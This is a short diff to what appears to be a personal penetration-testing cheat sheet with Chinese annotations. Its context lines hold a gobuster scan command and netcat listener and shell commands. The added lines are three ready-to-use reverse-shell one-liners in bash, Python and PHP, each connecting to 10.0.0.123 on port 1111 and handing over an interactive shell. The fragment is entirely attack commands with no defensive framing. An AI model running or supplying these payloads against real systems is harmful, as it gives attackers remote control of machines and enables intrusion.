@@ -36,6 +36,9 @@ gobuster -w -q -p  http://ip/index.php -e txt php jsp css ..
 
 nc -lvp (192.168.0.1) 4444
 nc 192.168.0.1 4444 -e /bin/bash  连接到192.168.0.1 4444 并弹一个shell给192.168.0.1
+/bin/bash -i >& /dev/tcp/10.0.0.123/1111 0>&1
+python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.123",1111));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+php -r '$sock=fsockopen("10.0.0.123",1111);exec("/bin/sh -i <&3 >&3 2>&3");'
 
 
 linux一个提权程序
